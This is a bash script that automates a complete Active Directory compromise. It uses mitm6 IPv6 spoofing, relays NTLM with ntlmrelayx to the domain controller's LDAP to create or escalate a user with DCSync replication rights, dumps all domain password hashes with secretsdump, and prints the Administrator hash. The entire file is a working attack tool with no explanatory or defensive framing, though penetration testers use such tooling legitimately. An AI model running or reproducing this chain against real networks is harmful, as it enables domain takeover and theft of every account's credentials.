#!/bin/bash

function ctrl_c(){
    echo "Exiting..."
    kill $(ps aux | grep mitm6 | grep -v grep | awk '{print $2}') 2> /dev/null
    kill $(ps aux | grep ntlmrelayx | grep -v grep | awk '{print $2}') 2> /dev/null
    exit 1
}

trap ctrl_c INT

function ntlmRelay(){
    mitm6 -d $domain_name -i $interface &
    if [ $mode = "add" ]; then
        ntlmrelayx.py -6 -t "ldaps://${dc_ip}" --no-dump -wh "$(tr -dc a-z < /dev/urandom | head -c 7).${domain_name}" | tee relaylog.txt &
    else
        ntlmrelayx.py -6 -t "ldap://${dc_ip}" --no-dump -wh "$(tr -dc a-z < /dev/urandom | head -c 7).${domain_name}" --escalate-user $user | tee relaylog.txt &
    fi
    sleep 5
    grep -q Replication-Get-Changes-All relaylog.txt
    while [ $? -ne 0 ]; do
        sleep 2
        grep -q Replication-Get-Changes-All relaylog.txt
    done
    kill $(ps aux | grep mitm6 | grep -v grep | awk '{print $2}')
    kill $(ps aux | grep ntlmrelayx | grep -v grep | awk '{print $2}')
    if [ $mode = "add" ]; then
        addeduser=`grep Replication-Get-Changes-All relaylog.txt | tail -n 1 | awk '{print $4}'`
        userpass=`grep $addeduser relaylog.txt | head -n 1 | awk '{print $10}'`
    else
        addeduser=$user
        userpass=$password
    fi
    secretsdump.py "${addeduser}:${userpass}@${dc_name}" | tee hashdump
    clear
    if [ $mode = "add" ]; then
        echo "User created: ${addeduser}, password: ${userpass}"
        printf "\n"
    fi
    echo "Paste this on the command prompt below and hit return to erase the user created, otherwise hit ctrl + c, the dump is inside hashdump file, the hash won't show up after pasting it, so  just paste it and hit return"
    cat hashdump | grep Administrator | head -n 1 | cut -d ":" -f 3,4 
    printf "\n"
    python3 aclpwn.py/aclpwn.py -r $(ls | grep restore)
    rm $(ls | grep restore)
    cat hashdump
}

function helpMenu(){
    echo "Usage:"
    echo '-m <attack mode>, select attack mode, add or escalate, escalate needs user and password set'
    echo '-d <domain name>, for example company.local'
    echo '-i <interface>, for example eth0'
    echo '-n <full dc name>, for example dc.company.local'
    echo '-t <dc ip>'
    echo '-u <username>'
    echo '-p <password>'
    echo '-h Show this menu'
    exit 0
}
    
if [ "$(echo $UID)" -eq 0 ]; then
    while getopts ":d:i:n:t:m:u:p:h" arg; do
        case $arg in
            d) domain_name=$OPTARG ;;
            i) interface=$OPTARG ;;
            n) dc_name=$OPTARG ;;
            t) dc_ip=$OPTARG ;;
            m) mode=$OPTARG ;;
            u) user=$OPTARG ;;
            p) password=$OPTARG ;;
            h) helpMenu ;;
        esac
    done

    if [ -z $domain_name ] || [ -z $interface ] || [ -z $dc_name ] || [ -z $dc_ip ]; then
        helpMenu
    else
        if [ ! -f aclpwn.py/aclpwn.py ]; then
            echo "aclpwn wasn\'t found on the current directory, cloning it"
            git clone https://github.com/fox-it/aclpwn.py
        fi
        if [ $mode = "add" ]; then
            ntlmRelay
        elif [ $mode = "escalate" ]; then
            if [ ! -z $user ] || [ ! -z $password ]; then
                ntlmRelay
            else
                echo "You need to set a username and a password"
            fi
        else
            echo "Invalid mode"
            printf "\n"
            helpMenu
        fi
    fi
else
    echo "You have to run this as root"
fi
